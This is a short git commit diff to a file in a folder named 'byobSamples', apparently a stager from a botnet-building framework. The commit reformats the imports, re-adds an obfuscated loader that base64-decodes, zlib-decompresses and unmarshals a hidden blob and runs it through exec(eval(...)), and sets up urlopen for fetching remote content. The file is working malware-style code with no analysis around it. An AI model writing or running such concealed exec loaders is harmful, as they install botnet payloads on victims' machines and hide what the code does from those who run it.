a93288b91d1aca0e52bba92e238436432acfd2ab
alextibor <alex.tibor@hotmail.com>
2022-02-07 19:19:30 -0300

    att

--- byobSamples/byob_aUI.py
+++ byobSamples/byob_aUI.py
@@ -1,5 +1,9 @@
-import sys,zlib,base64,marshal,json,urllib
+import sys, zlib, base64, marshal, json, urllib
+
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3tLDUMzbXMzfUMzQzsTI0NrbQ1y8uSUxPLSrWTwz11CuoVNfUK0pNTNHQBAA+7xIG')))))
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode(
+    b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3tLDUMzbXMzfUMzQzsTI0NrbQ1y8uSUxPLSrWTwz11CuoVNfUK0pNTNHQBAA+7xIG')))))
+
+#alex
